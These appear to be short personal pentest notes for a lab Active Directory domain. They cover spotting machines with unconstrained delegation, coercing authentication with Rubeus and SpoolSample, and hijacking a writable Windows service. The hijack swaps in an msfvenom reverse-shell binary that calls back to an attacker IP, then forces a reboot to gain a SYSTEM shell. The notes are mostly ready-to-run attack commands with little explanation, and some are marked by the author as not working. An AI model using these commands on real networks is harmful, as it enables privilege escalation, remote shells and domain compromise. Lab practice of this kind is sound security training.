# Unconstrained delegation

Check if the there is any machine with unconstrained delegation

```powershell
powershell -ep bypass -c "Get-ADComputer -Filter {TrustedForDelegation -eq $true -and primarygroupid -eq 515} -Properties trustedfordelegation,serviceprincipalname,description"
```

```powershell
.\Rubeus.exe 
 .\SpoolSample.exe goku raditz


 # Those COMMAND DO NOT WORK ( NO FUNCIONAN >:( ))
 certutil.exe -urlcache -f http://raditz.capsulecorp.local
 Invoke-WebRequest http://raditz.capsulecorp.local -UseDefaultCredentials -UseBasicParsing
```


# Vulnerable service

Because any local user has full control over the VulnService's folder, it is possible to replace the file at `C:\\Program Files\\Vulnerable Service\\` for the one created with **msfvenom**.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=<PORT> -f exe-service -o Service.exe
```

Then, restart the machine, and you should receive a reverse shell as `nt authority\system`.

```bash
shutdown /r /t 0
```